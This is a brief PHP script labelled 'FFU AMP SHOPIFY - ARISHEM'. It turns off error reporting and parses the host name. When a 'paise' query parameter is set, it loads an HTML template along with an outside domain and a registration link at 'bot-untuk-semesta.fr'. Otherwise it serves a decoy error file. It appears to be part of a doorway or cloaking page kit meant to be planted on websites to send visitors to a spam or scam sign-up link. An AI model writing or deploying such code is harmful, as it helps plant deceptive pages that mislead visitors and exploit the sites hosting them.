<?php
    error_reporting(0);
    //FFU AMP SHOPIFY - ARISHEM

    $domain = $_SERVER['HTTP_HOST'];
	$request = $_SERVER['REQUEST_URI'];
    $cookie = explode("-",$domain);
	
	if(isset($_GET['paise']) && $_GET['paise'] !== "") {
			$nama = $_GET['paise'];
			$gen1 = $cookie[0];
			$gen2 = $cookie[1];
			$gen3 = "com";
			$action = explode(".",$cookie[2]);
			$action_link = $action[0];
			$domain_name = "fate.24cc.cc";
			$urlzzz = "https://bot-untuk-semesta.fr/account/register/mktintan123";
			include("index.html");
	} else {
		include("test_error.txt");
	}
?>
